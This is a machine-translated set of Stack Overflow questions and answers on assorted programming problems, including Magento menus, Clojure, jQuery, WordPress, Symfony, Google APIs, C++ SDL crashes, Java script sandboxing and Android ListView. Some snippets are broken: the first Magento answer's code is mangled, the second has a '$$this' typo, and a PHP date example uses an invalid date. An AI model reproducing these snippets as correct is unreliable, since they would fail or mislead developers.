> 
> 时间：2012-04-27T08:30:45.527

不是未定义的行为。逗号是[序列点](http://en.wikipedia.org/wiki/Sequence_point)。

# c# - WPF 如何将 ListBox.ItemsSource 转换为 ObservableCollection

> ID：10347300
> 
> 赞同：2
> 
> 时间：2012-04-27T08:28:14.057
> 
> 标签：c#, behavior, covariance

我写了一个允许重新排序列表框的行为。要正常工作，ListBox 的 ItemsSource 必须是 ObservableCollection<...>，所以我可以调用 Move(from,to) 方法。

我的问题是：如何将 ListBox.ItemsSource 转换为 ObservableCollection。

我已经尝试过：

```
ObservableCollection<object> test = listBox.ItemsSource as ObservableCollection<object>; 
```

这不起作用，因为 ObservableCollection 不支持协方差。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T08:56:36.277

由于您知道要调用的方法`ObservableCollection<T>.Move`，因此可以使用简单的反射：

```
var move = listBox.ItemsSource
                  .GetType()
                  .GetMethod("Move");
if (move != null)
{
    move.Invoke(listBox.ItemsSource, new[] { old, new });
}
else
{
    // IList fallback?
} 
```

# ios - 如何成为 iOS 的 MDM 供应商

> ID：10347305
> 
> 赞同：9
> 
> 时间：2012-04-27T08:28:25.213
> 
> 标签：ios, mdm

对此做了很多研究。看了几个意见，很少有人说我需要一个 Apple Enterprise 帐户，很少有人说我不需要。拥有MAC服务器会有所帮助吗？我是否需要拥有企业帐户才能成为 MDM 供应商。任何指针都会很棒。

我看到了 MDM 提供的技术业务文档，但它并没有解释服务器内部实现的任何内容。

任何帮助都会很棒！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-20T16:50:01.507

要成为 MDM 供应商，您需要：

1) 苹果企业账户

2) 联系 Apple (https://developer.apple.com/contact/submit.php) 并要求成为 MDM 供应商。

它们应该使您成为 MDM 供应商，并且您将在“证书”部分中有一个“其他”选项卡来发送证书。用于 MDM 目的的签名请求。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-04-27T10:10:23.743

您确实需要一个企业帐户，但我不确定您是否还需要特别要求成为供应商。您不需要 Mac 服务器。

至于您的请求的详细信息 - 您是在谈论签署您的“客户”证书签名请求，这是现在成为供应商或实际设置和运行 MDM 服务所需的步骤？

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-05-02T11:53:37.573

经过研究，我们需要有一个来自 Apple 的 Enterprise Developer 帐户，并且我们需要使用 Apple 的推送通知服务器从 Web 服务器发送 MDM 有效负载。

# magento - Magento 在导航菜单中提供悬停标题文本弹出窗口

> ID：10347308
> 
> 赞同：0
> 
> 时间：2012-04-27T08:28:35.610
> 
> 标签：magento

目前我正在使用magento 1.6.1.0。我有6个类别。在悬停到任何类别时，我希望出现一些文本。假设我的第一个类别是家具，将光标移至该家具菜单时，我希望文本“单击以查看我们的家具收藏”显示为小弹出测试。通常在 html 中，我会使用 title="click to see our Furniture colections" 来做到这一点。

但是在php中我不知道该怎么做。到目前为止，我找到了调用类别的 phtml 文件。来自 app/design/frontend/default/mytheme/template/catalog/navigation/top.phtml

请告诉我如何做到这一点..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T08:47:31.460

首先，我的回答**不是**解决您的问题的好方法，但它会做到。好的方法是覆盖一个块，而不是编辑核心块。

编辑文件**app/code/core/Mage/Catalog/Block/Navigation.php**找到行
*$html[] = 'getCategoryUrl($category).'"'.$linkClass.'>';*
（对我来说是第 286 行)
将其转换为
*$html[] = 'escapeHtml($category->getName())。集合" href="'.$this->getCategoryUrl($category).'"'.$linkClass.'>';*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-30T13:51:52.417

为此，您应该对 Magento 有所了解。

打开文件*app/code/core/Mage/Catalog/Block/Navigation.php*并转到第 286 行。

```
$html[] = '<a href="'.$this->getCategoryUrl($category).'"'.$linkClass.'>'; 
```

您应该将此行更改为

```
$html[] = '<a href="'.$this->getCategoryUrl($category).'"'.$linkClass.' title="click to see our '. $$this->escapeHtml($category->getName()) .' colections">'; 
```

# clojure - Clojure 中的矩阵转置

> ID：10347315
> 
> 赞同：28
> 
> 时间：2012-04-27T08:29:02.453
> 
> 标签：clojure, matrix

在 Clojure 中，矩阵的可能表示是向量的向量，即`[[1 2] [3 4]]`。转置矩阵的可能实现是：

```
(defn transpose [matrix]
  (loop [matrix matrix, transp [], i 0]
    (if (< i (count (nth matrix 0)))
      (recur matrix 
             (conj transp
                   (vec (reduce concat
                                (map #(conj [] (nth %1 i))
                                     matrix))))
             (inc i))
      transp))) 
```

谁能想到一个更惯用的 Clojure 实现？例如，为了避免这种可怕的循环再次发生？

* * *

## 回答 #1

> 赞同：74
> 
> 时间：2012-04-27T08:35:20.813

通常的解决方案是

```
(defn transpose [m]
  (apply mapv vector m)) 
```

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2014-02-20T02:13:12.973

截至 2014 年，我建议在 Clojure 中使用[core.matrix](https://github.com/mikera/core.matrix)进行任何数值工作。

除其他外，它提供了所有最常见的矩阵运算的实现：

```
(use 'clojure.core.matrix)

(transpose [[1 2] [3 4]])
=> [[1 3] [2 4]] 
```

# jquery - 如何使用 jquery 从中提取 img 元素？

> ID：10347316
> 
> 赞同：-4
> 
> 时间：2012-04-27T08:29:02.680
> 
> 标签：jquery

如何从中获取 img 元素：

```
<td><img src="blah" /></td> 
```

谢谢。

编辑：我的意思是，当我为每次迭代循环遍历每个语句并且我想摆脱 `<td></td>`. 我不是在搜索整个文档。

进一步编辑：这里有更多代码。我试图切入问题的核心，但解释得不够好。

```
$(this).closest('tr').children().each(function(){
//some code

        }); 
```

那是我的 each 函数，它获取表格行的所有 td 元素。在文本的情况下，我可以使用 text() 函数来获取文本，但是当它是

```
 <td><img /></td> 
```

我不知道怎么把img弄出来。这有助于解释吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T08:30:05.940

**重新*编辑*：**使用[`find`](http://api.jquery.com/find)：

```
$(this).closest('tr').children().each(function(){
    // Get all `img` elements that are in this cell
    var $img = $(this).find("img");
}); 
```

* * *

**问题明确之前的较旧答案**：

没有更多上下文，很难很好地回答，但基本上，将[`jQuery()`](http://api.jquery.com/jQuery)函数（通常别名为`$()`）与 CSS 选择器一起使用。所以这可能是：

```
var img = $("td img"); 
```

或只有孩子

```
var img = $("td > img"); 
```

但请注意，在这两种情况下，您都将获得**元素** `img`的后代（第一个示例）或直接子代（第二个示例）的所有`td`元素。

此外，在上述两种情况下，您都会得到一个包装了一组匹配元素的 jQuery 对象。要获取实际的底层 DOM 元素，请对对象进行索引。例如，这将为您提供文档中元素`img`的后代的第一个元素：`td`

```
var rawImgElement = $("td img")[0]; 
```

...如果没有，那就是`undefined.`

* * *

重新编辑：

> ...我想摆脱`<td></td>`

目前还不清楚您要达到的目标*。*这是一个将所有元​​素移出表格的示例`img`，将它们放在表格后面（当然，您不能只将`img`元素移出`td`元素，因为`img`不能是 的直接子代`tr`）。

HTML：

```
<table id="myTable">
<tbody>
<tr>
<td><img src="blah1.png"></img></td>
<td><img src="blah2.png"></img></td>
<td><img src="blah3.png"></img></td>
</tr>
</tbody>
</table> 
```

JavaScript：

```
$(function() {
    var $myTable = $("#myTable");
    $("td > img").each(function() {
        var $img = $(this),
            $td = $img.parent();
        $img.insertAfter($myTable);
    });
}); 
```

...当然，那么表格可能是空的，您可能需要删除行等。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T08:31:09.707

这将引用图像标签：

```
$("td img") 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T08:32:51.737

如果您正在为所有 td 做某事以操纵某事

```
$('#table td').each(function() {
var img;
img = $(this).find('img');
alert(img.attr('src'));
}); 
```

# wordpress - WPDB Wordpress 带斜杠（删除斜杠）

> ID：10347324
> 
> 赞同：3
> 
> 时间：2012-04-27T08:29:30.193
> 
> 标签：wordpress

我在我的主题中使用 Wordpress 中的 WPDB 类作为我的数据......

现在让我们说在我们保存的数据库中

```
This isn\'t my name 
```

现在，我想使用以下方法删除完整字段的斜线

```
 $query= 'SELECT * FROM quotes'; 
  $quotes= $wpdb->get_results($sql); 
```

有没有办法我可以对 $quotes 中的所有字段执行**递归**操作，这实际上会变成条形斜杠（PHP）并返回类似的东西（对于对象内的所有字段）

```
This isn't my name 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-04T21:00:51.130

我认为您想要的是[stripslashes_deep](http://codex.wordpress.org/Function_Reference/stripslashes_deep)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T04:20:08.733

由于`$wpdb->get_results()`函数返回一个对象数组`stdClass`，为了删除每一行中所有列中的斜线，您必须遍历行，并遍历在其上运行 PHP`stripslashes()`函数的每个行对象的属性。

```
foreach( $quotes as &$quote ) {
    foreach( $quote as &$field ) {
        if ( is_string( $field ) )
            $field = stripslashes( $field );
    }
} 
```

关于 wpdb->get_results() 函数的更多信息：http: [//codex.wordpress.org/Class_Reference/wpdb#SELECT_Generic_Results](http://codex.wordpress.org/Class_Reference/wpdb#SELECT_Generic_Results)

# php - 是否可以可靠地将 symfony 2.0 与 WAMP 服务器一起使用？

> ID：10347325
> 
> 赞同：1
> 
> 时间：2012-04-27T08:29:36.007
> 
> 标签：php, apache, symfony, wamp, wampserver

这是我的设置：

*   视窗 XP SP2
*   WAMP 2.2（php 5.3.9、apache 2.2.21、mysql 5.5.20）
*   Symfony 2.0

我遇到了一个基本上是这样的问题：

[Symfony-2.0 供应商 Apache](https://stackoverflow.com/questions/9788980/symfony-2-0-vendors-apache)

一切似乎都很好：

*   运行 mysqltest.php 将 OK 连接到数据库。
*   localhost/web/config.php 就可以了（只是建议设置intl和APC）
*   “php app/bin 学说：模式：创建”成功创建模式。

但是，当我尝试：

*   “本地主机/web/app.php”
*   “本地主机/网络/app_dev.php”

Apache 崩溃（windows 弹出窗口说一些关于 php5ts.dll 的内容）并且日志中唯一有意义的内容是：

*   [Fri Apr 27 05:03:54 2012] [notice] Child 3528：启动线程以侦听端口 80。
*   [Fri Apr 27 05:07:00 2012] [notice] 父进程：子进程退出，状态为 3221225477 -- 正在重新启动。
*   [Fri Apr 27 05:07:01 2012] [notice] Apache/2.2.21 (Win32) PHP/5.3.9 已配置 -- 恢复正常操作

我之前提到的问题的解决方案是使用 php 5.4，好吧，如 [如何让 PDO 使用 PHP 5.4 在 WAMP 上工作中所述？](https://stackoverflow.com/questions/10155624/how-do-i-get-pdo-to-work-on-wamp-with-php-5-4) 除了 WAMP 未正式支持 5.4 之外，许多扩展在 5.4 上不起作用（APC、PDO 可能？）。

旧版本的 php 也被排除在外。官方 WAMP 插件仅适用于 php 5.3.0 和 5.3.1，而 symfony2 至少需要 5.3.2。

我还在 Windows Server 2003 机器上尝试过，结果相同。这花费了很多时间，我什至考虑使用我通常的 symfony 设置在服务器上添加一个 Linux VM。

所以我需要知道是否有可能拥有一个稳定的 symfony2/WAMP2.2 环境，这并不意味着失去扩展和 symfony2 功能，例如学说。

欢迎任何想法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T17:59:41.070

我无法让 wampserver 工作。

我也尝试过[XAMPP 1.7.7 (php 5.3.8)](http://www.apachefriends.org/en/xampp-windows.html)和[其他发行版](http://en.wikipedia.org/wiki/Comparison_of_WAMPs)，并且一遍又一遍地遇到同样的问题。

显然，我收到的错误消息根本没有用，正如[这里](https://issues.apache.org/bugzilla/show_bug.cgi?id=38086)所建议的那样，它只是一个“崩溃的”消息。

我在任何安装的日志中都找不到任何其他消息，所以我无法判断这是 symfony2 错误、php 错误还是 apache 错误。

无论如何，我得到的错误消息完全没用，我所能做的就是远离 Windows。我在虚拟机中设置了 LAMP(Linux) 环境并从 Windos 主机运行它，已经几个月了，到目前为止我还没有遇到任何问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-06-15T15:04:32.000

[根据此处](https://stackoverflow.com/a/34452918/1374947)给出的解释，我在正在运行的 Apache 服务器的“httpd.conf”文件的末尾添加了以下几行：

```
<IfModule mpm_winnt_module>
    ThreadStackSize 8888888
</IfModule> 
```

到目前为止没有遇到任何问题。

# php - 从 google drive api 检索文件元数据

> ID：10347327
> 
> 赞同：0
> 
> 时间：2012-04-27T08:29:41.710
> 
> 标签：php, google-drive-api

我正在开发一个网络应用程序，让用户查看存储在谷歌驱动器上的视频文件并使用 html5 播放器播放它们。

我使用 Google Picker 来显示用户文件。选择文件时，用户会被重定向到类似 myfile.php?id={file_id} 的 url

在登录页面上，如果我使用下面这样的代码，我会收到一个`403 error (failed to open stream: HTTP request failed! HTTP/1.0 403 Forbidden)`.

```
<?php
$url="https://www.googleapis.com/drive/v1/files/".$_GET["id"]."";
$json = file_get_contents($url);
$data= json_decode($json,true);
print_r($data);
?> 
```

我是否需要再次检查用户是否已登录？如果是这样，哪种方法更快？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T15:55:20.823

如果文件不是公开的（仅共享给特定的一组用户），则请求必须包含授权标头（特别是 OAuth 2.0 标头）。

我建议查看[PHP DrEdit 示例代码](https://developers.google.com/drive/examples/php)，以便您熟悉与 Drive Web UI、Picker API 和授权机制的集成。

# jquery - 停止 iframe YouTube 视频

> ID：10347330
> 
> 赞同：0
> 
> 时间：2012-04-27T08:29:49.773
> 
> 标签：jquery, youtube, youtube-api

我有一个嵌入的 YouTube 视频。

```
<iframe width="490" height="279" src="http://www.youtube.com/embed/X7ab_dVhkWk?version=3&enablejsapi=1" frameborder="0" allowfullscreen></iframe> 
```

嵌入时的 HTML：

```
<embed width="100%" height="100%" id="video-player-flash" type="application/x-shockwave-flash" src="http://s.ytimg.com/yt/swfbin/watch_as3-vflCBBX6J.swf" allowscriptaccess="always" allowfullscreen="true" bgcolor="#000000" flashvars="el=embedded&amp;fexp=904544%2C909703%2C920701&amp;is_html5_mobile_device=false&amp;allow_ratings=1&amp;allow_embed=1&amp;tabsb=1&amp;sendtmp=1&amp;hl=en_US&amp;eurl=http%3A%2F%2Fdev.springcorp.co.uk%2Fhistoricscotland%2Fstirling%2Ffacebook-april2012%2F&amp;iurl=http%3A%2F%2Fi2.ytimg.com%2Fvi%2Fai55pL37saU%2Fhqdefault.jpg&amp;view_count=117&amp;title=Regent%20Arran%20Stirling%20Castle%20TV%20ad%202012&amp;avg_rating=0&amp;video_id=ai55pL37saU&amp;length_seconds=31&amp;iurlmaxres=http%3A%2F%2Fi2.ytimg.com%2Fvi%2Fai55pL37saU%2Fmaxresdefault.jpg&amp;enablejsapi=1&amp;sk=UX8fbMJpKT-VH3IVkWhtN7gCKU1r3TSzC&amp;rel=1&amp;playlist_module=http%3A%2F%2Fs.ytimg.com%2Fyt%2Fswfbin%2Fplaylist_module-vflfGS7wE.swf&amp;iurlsd=http%3A%2F%2Fi2.ytimg.com%2Fvi%2Fai55pL37saU%2Fsddefault.jpg&amp;jsapicallback=ytPlayerOnYouTubePlayerReady&amp;playerapiid=player1&amp;framer=http%3A%2F%2Fdev.springcorp.co.uk%2Fhistoricscotland%2Fstirling%2Ffacebook-april2012%2F"> 
```

如何使用 JavaScript 停止此视频？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T10:34:11.370

最后我不得不使用 api 嵌入，所以我参考了 vid。（xxxx 是视频的 youtube id）

```
<div id="player"></div>
<div id="player2"></div>
<div id="player3"></div>

<script>
    //Load player api asynchronously.
    var tag = document.createElement('script');
    tag.src = "http://www.youtube.com/player_api";
    var firstScriptTag = document.getElementsByTagName('script')[0];
    firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
   var done = false;
    var player;
    var player2;
   var player3;
    function onYouTubePlayerAPIReady() {
        player = new YT.Player('player', {
          height: '279',
          width: '490',
          videoId: 'xxxxxxxx',

        });

       player2 = new YT.Player('player2', {
          height: '279',
          width: '490',
          videoId: 'xxxxxxx',

        });

        player3 = new YT.Player('player3', {
          height: '279',
          width: '490',
          videoId: 'xxxxxx',

       });
    }

    function stopVideo() {
    player.stopVideo();

    } 
```

# php - 如何在表单中使用两种日期类型？

> ID：10347333
> 
> 赞同：0
> 
> 时间：2012-04-27T08:29:56.613
> 
> 标签：php

好吧，基本上我现在正在处理联系表格，我需要添加两种日期类型。用户可以指定他们将在配置文件中使用的日期，然后它使用 if 语句在表单中显示确切的日期类型（美国或欧洲）。这很容易，我可以使用 if 语句来完成，但接下来是将日期类型保存到数据库中。好吧，基本上我的数据库表是时间戳，保存欧洲时间很容易，但是美国时间呢？基本上，在我的美国时间表格中有一个小时（1-12），分钟（1-60）和周期（AM和PM），基本上3个选择输入，所以任何想法，我怎么能将它们转换为24小时时间，然后作为欧洲日期保存到数据库？

已经用欧洲日期完成了所有事情，现在只剩下美国时间了。

希望你明白我的意思。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T08:41:13.007

使用`DateTime`它可以在您想要的任何日期和时间格式之间进行转换

```
$date = DateTime::createFromFormat("m/d/Y","03/32/2012");
echo $date->format("d-m-Y"); // You can use any format 
```

或者

```
echo $date->format("U"); // Timestamp 
```

如果您只想使用函数

```
$date = date_create_from_format("m/d/Y","03/32/2012");
echo date_format($date, "d-m-Y"); 
```

有关不同格式的文档：[http ://www.php.net/manual/en/datetime.createfromformat.php](http://www.php.net/manual/en/datetime.createfromformat.php)

# cordova - 使用 PhoneGap 开发跨浏览器应用程序需要什么？

> ID：10347335
> 
> 赞同：0
> 
> 时间：2012-04-27T08:29:58.313
> 
> 标签：cordova, cross-platform

对于开发跨浏览器的 PhoneGap 应用程序需要什么，我有点困惑。

从他们的[入门](http://phonegap.com/start)页面，我必须选择一个平台。我以为这是跨平台的。

如果我真的希望它是跨平台的，我还需要为所有手机下载所有软件包吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:37:58.717

PhoneGap 应用程序有两个组件：

*   （应该）构成大部分代码库的 HTML/JavaScript 应用程序。
*   您想要支持的每个电话平台的特定于平台的包装器，以及您构建的任何自定义本机插件。

如果您可以在没有自定义插件的情况下使用 HTML/JavaScript 完成整个应用程序，您可以使用[PhoneGap Build](https://build.phonegap.com/)服务上传您的 web 应用程序的 zip 文件，并接收您想要支持的每个平台的特定平台包，这些包构建在云中.

如果您不想使用云构建，或者需要开发自己的自定义插件，则需要为您想要支持的每个平台提供本机 SDK。至少，您需要这些来构建每个平台的包以分发到应用商店。

您还需要在开发期间使用本机 SDK 进行设备上的调试。如果只是 HTML 和 JavaScript，那么在 Chrome 和 IE9 上进行测试可以帮助您完成大部分工作，但您有时需要在设备上进行测试。

# c++ - 我怎样才能弄清楚这个分段错误发生的位置和原因？

> ID：10347336
> 
> 赞同：3
> 
> 时间：2012-04-27T08:30:04.867
> 
> 标签：c++, segmentation-fault, game-engine

我无法找出我的代码的问题......我正处于游戏原型设计的早期阶段（我的第一个严肃项目）。它经常（但并非总是）因分段错误而崩溃。这是程序的流程......

*   标题画面 - 按 z 开始新游戏
*   屏幕上的玩家和敌人......敌人在碰撞时会夺走一条生命，有 4 条生命。
*   当角色生命为 0 时，游戏返回标题画面 - 按 z 开始新游戏

最后一步是崩溃发生的地方...崩溃似乎只发生在玩家死亡并被带回标题屏幕并且玩家按z开始另一场游戏之后，但它并不总是崩溃。通过gdb，我确定它发生在标题的解构器被调用时......

这是调试信息和相关代码...如果需要，我将提供任何其他代码/信息。

```
*** glibc detected *** /home/rzrscm/code/demogamething/game: free(): invalid pointer: 0x080c6b98 ***

//memory map info omitted

0xb7c54537 in raise () from /lib/libc.so.6
(gdb) where
#0  0xb7c54537 in raise () from /lib/libc.so.6
#1  0xb7c57922 in abort () from /lib/libc.so.6
#2  0xb7c8afbd in ?? () from /lib/libc.so.6
#3  0xb7c950ca in ?? () from /lib/libc.so.6
#4  0xb7c96918 in ?? () from /lib/libc.so.6
#5  0xb7c99a5d in free () from /lib/libc.so.6
#6  0xb7f4e776 in SDL_FreeSurface () from /usr/lib/libSDL-1.2.so.0
#7  0x0804ac7f in ~Title (this=0x80b4250, __in_chrg=<value optimized out>) at title.cpp:13
#8  0x08049d3a in GameState::load (this=0x804e368, loadState=LEVEL) at gamestate.cpp:39
#9  0x08049c5c in GameState::change (this=0x804e368, changeTo=LEVEL) at gamestate.cpp:26
#10 0x08049753 in Player::handleEvent (this=0x804e300) at player.cpp:102
#11 0x080490c8 in main () at main.cpp:27 
```

所以，我所知道的是，当它将状态从 TITLE 更改为 LEVEL 时会发生崩溃......这是卸载和加载状态的类函数...... currentState 是 GameState 类中的私有向量......

```
std::vector<GameState *> currentState;

void GameState::load(STATE loadState) {
    if(state == TITLE) {
        while(!currentState.empty()) {
            delete currentState.back();
            currentState.pop_back();
        }
        currentState.push_back(new Title()); 
    }
    else if(state == LEVEL) {
        while(!currentState.empty()) {
            delete currentState.back();
            currentState.pop_back();
        }
        currentState.push_back(new Level(currentLevel));
   }
} 
```

当调用 Title 类的解构函数时会发生崩溃......无论是释放音乐还是图像都会发生......无论哪个是第一个函数，它都会崩溃。

```
Title::~Title() {
    SDL_FreeSurface(background);
    Mix_FreeMusic(music);
    background = NULL;
    music = NULL;
} 
```

这是图像加载功能的代码...

```
SDL_Surface *loadImage(std::string imageFile) { 
    SDL_Surface *loadedImage;
    SDL_Surface *newImage; 

    loadedImage = IMG_Load(imageFile.c_str()); 
    newImage = SDL_DisplayFormatAlpha(loadedImage); 

    SDL_FreeSurface(loadedImage); 

    return newImage; 
```

}

[编辑] 我在调试器中运行了几次，但没有更改代码，因为我仍然找不到问题所在……而且每次在尝试释放音乐时发生崩溃……

```
0xb7c54537 in raise () from /lib/libc.so.6
(gdb) backtrace
#0  0xb7c54537 in raise () from /lib/libc.so.6
#1  0xb7c57922 in abort () from /lib/libc.so.6
#2  0xb7c8afbd in ?? () from /lib/libc.so.6
#3  0xb7c950ca in ?? () from /lib/libc.so.6
#4  0xb7c9633e in ?? () from /lib/libc.so.6
#5  0xb79974e2 in ?? () from /usr/lib/libmikmod.so.2
#6  0xb7997640 in Player_Free () from /usr/lib/libmikmod.so.2
#7  0xb7ebb6e3 in Mix_FreeMusic () from /usr/lib/libSDL_mixer-1.2.so.0
#8  0x0804ac8d in ~Title (this=0x80c6bc0, __in_chrg=<value optimized out>) at title.cpp:14
#9  0x08049d3a in GameState::load (this=0x804e368, loadState=LEVEL) at gamestate.cpp:39
#10 0x08049c5c in GameState::change (this=0x804e368, changeTo=LEVEL) at gamestate.cpp:26
#11 0x08049753 in Player::handleEvent (this=0x804e300) at player.cpp:102
#12 0x080490c8 in main () at main.cpp:27 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T08:33:11.567

```
#5  0xb7c99a5d in free () from /lib/libc.so.6
#6  0xb7f4e776 in SDL_FreeSurface () from /usr/lib/libSDL-1.2.so. 
```

您可能正在释放一个无效的指针。现在我读

```
free(): invalid pointer: 0x080c6b98 
```

您可能正在尝试释放未动态分配的对象。如何`background`得到他的价值？

# objective-c - cocoa：在NSWebView中，点击超链接触发，有什么办法

> ID：10347340
> 
> 赞同：0
> 
> 时间：2012-04-27T08:30:07.007
> 
> 标签：objective-c, xcode, macos, cocoa, uiwebview

`– webView:shouldStartLoadWithRequest:navigationType:`在 web 视图中点击超链接触发 ，有什么办法可以做到这一点吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:09:55.477

```
//WebView will automatically load the hyperlink u need not to do anything out there except.
//Inherit <UIWebViewDelegate> in self;
urwebview.delegate=self;
In self implement delegate method 
- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType
{
    //Its call back receved whenever ur webview is navigated By clicking on hyperlink
} 
```

# java - 在 Java Scripting 中禁用 importPackage、importClass 和 JavaImporter

> ID：10347342
> 
> 赞同：2
> 
> 时间：2012-04-27T08:30:12.047
> 
> 标签：java, security, scripting

是否可以禁用将类路径中的内容导入到 java 脚本 API 中的脚本的功能？目标是让脚本编写者在脚本运行时只能访问引擎绑定中的内容。在某些情况下，将随机类导入脚本可能是一个安全问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T10:56:06.597

可以覆盖这些函数的定义并像这样清理脚本：

```
private String sanitizeScript(String script) {
    if (containsMoreThanOneStatement(script)) {
        throw new ScriptedPermissionsException("Scripts may only contain one statement!!");
    }
    return new StringBuilder()
            .append("function importPackage(a){ throw 'Cannot import!'};").append('\n')
            .append("function importClass(a){ throw 'Cannot import!'};").append('\n')
            .append("function JavaImporter(a){ throw 'I said, no importing!!'};").append('\n')
            .append(script).append(';')
            .toString();
} 
```

然而，这仍然有一个仍然可以做的警告

```
java.lang.Class.forName('foo.bar.Zap') 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-18T00:15:08.047

如果您的意图是限制对导入函数的所有调用，那么在初始化 ScriptEngine 时将它们设为空

```
engine.eval("importPackage = null;"); 
```

# google-docs-api - 无法将本地图像文件上传到格式转换的谷歌文档

> ID：10347345
> 
> 赞同：0
> 
> 时间：2012-04-27T08:30:24.407
> 
> 标签：google-docs-api

对于公共链接，它工作正常，但在我的情况下，我需要从本地磁盘上传图像文件。我将图片转换为base64格式，并将html文件也写入本地磁盘，该html文件可以在浏览器中打开并显示图像，但google doc中的文档只是一个空文件，即使我将该html文件拖到google文档图像仍然不存在。我的代码如下：

```
DocsService client = new DocsService("testappv3");
client.setUserCredentials("username", "password");
File file = new File("c:/test.bmp");
ByteArrayOutputStream out = new ByteArrayOutputStream();
BufferedInputStream in = new BufferedInputStream(new FileInputStream(file));

int read;
byte[] buff = new byte[1024];
while ((read = in.read(buff)) > 0)
{
    out.write(buff, 0, read);
}
out.flush();

String base64 = Base64.encode(out.toByteArray());
String mimeType = DocumentListEntry.MediaType.fromFileName(file.getName()).getMimeType();
String html = "<html><body><img src=\"data:" + mimeType + ";base64," + base64 + "\"/></body></html>";

URL destFolderUrl = new URL("https://docs.google.com/feeds/default/private/full/<FOLDER_ID>/contents");
DocumentEntry newDocument = new DocumentEntry();
newDocument.setTitle(new PlainTextConstruct("test"));
newDocument.setMediaSource(new MediaByteArraySource(html.getBytes(), "text/html"));
newDocument = client.insert(destFolderUrl, newDocument); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-22T09:06:05.423

看我的经验水平只有几年所以我很可能是错的但是....我的理解是你不能再使用

```
client.insert(destFolderUrl, newDocument);// but now must use ResumableGDataFileUploader

new ResumableGDataFileUploader.Builder(client, new URL(uploadLink), mediaFile, null ) 
```

希望有更多知识的人会确认或否认

# java - 自定义 Android ListView

> ID：10347347
> 
> 赞同：0
> 
> 时间：2012-04-27T08:30:32.593
> 
> 标签：java, android, listview

A 必须在我的应用程序中自定义标准 ListView 控件。

我为此查看了 Lynda.com 的视频教程，并做了他们展示的一切。

我的活动布局：

```
<?xml version="1.0" encoding="utf-8"?>
<AbsoluteLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="match_parent"
android:layout_height="match_parent" android:background="#ffffff">

<ListView
    android:id="@+id/menuList"
    android:layout_width="match_parent"
    android:layout_height="500dp"
    android:layout_x="0dp"
    android:layout_y="210dp"
    android:footerDividersEnabled="false">
</ListView>

<ImageView
    android:id="@+id/imageView1"
    android:layout_width="250dp"
    android:layout_height="110dp"
    android:layout_x="115dp"
    android:layout_y="100dp"
    android:src="@drawable/deserts_log" />

<ImageView
    android:id="@+id/deserts_home_btn"
    android:layout_width="60dp"
    android:layout_height="60dp"
    android:layout_x="20dp"
    android:layout_y="20dp"
    android:src="@drawable/green_home" />

</AbsoluteLayout> 
```

我的自定义 listView 行布局：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:orientation="horizontal" >

<ImageView
    android:id="@+id/custom_menu_item"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"/>

<TextView
    android:id="@+id/custom_menu_text"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"/>

</LinearLayout> 
```

所以我创建了自己的 LiasAdapter 类：

```
public class MyAdapter extends ArrayAdapter<String>
{
    public MyAdapter(Context context, int resource, int textViewResourceId,
            List<String> objects) {
        super(context, resource, textViewResourceId, objects);
        // TODO Auto-generated constructor stub
    }

    @Override
    public View getView(int position, View convertView, ViewGroup parent) {

        LayoutInflater inflater = (LayoutInflater)getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        View row = inflater.inflate(R.layout.custom_menu_row, parent);
        String[] data = {"Десерт 1", "Десерт 2", "Десерт 3"};
        ImageView iv = (ImageView)row.findViewById(R.id.custom_menu_item);

        if(data[position]=="Десерт 1")
        {
            iv.setImageResource(R.drawable.desert1);
        }

        if(data[position]=="Десерт 2")
        {
            iv.setImageResource(R.drawable.desert2);
        }

        if(data[position]=="Десерт 3")
        {
            iv.setImageResource(R.drawable.desert3);
        }
        return row;
    }
} 
```

现在我如何创建我的列表结构并不重要，所以有一些“硬编码”））。

我为我的 ListView 控件设置了这个适配器：

```
listView = (ListView)findViewById(R.id.menuList);
    MyAdapter adapter = new      MyAdapter(this,R.layout.custom_menu_row,R.id.custom_menu_text,data);
    listView.setAdapter(adapter); 
```

因此，“数据”是有效的 ArrayList 集合。它构建时没有错误，但是当我尝试启动此活动时，它会因以下消息而崩溃：`" E/AndroidRuntime(495): java.lang.UnsupportedOperationException: addView(View, LayoutParams) is not supported in AdapterView"`

如果有人已经遇到过这个问题？在视频教程中自定义 listView 效果很好，但我没有:((

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T08:42:44.333

改变：

```
View row = inflater.inflate(R.layout.custom_menu_row, parent); 
```

到：

```
View row = inflater.inflate(R.layout.custom_menu_row, parent, false); 
```

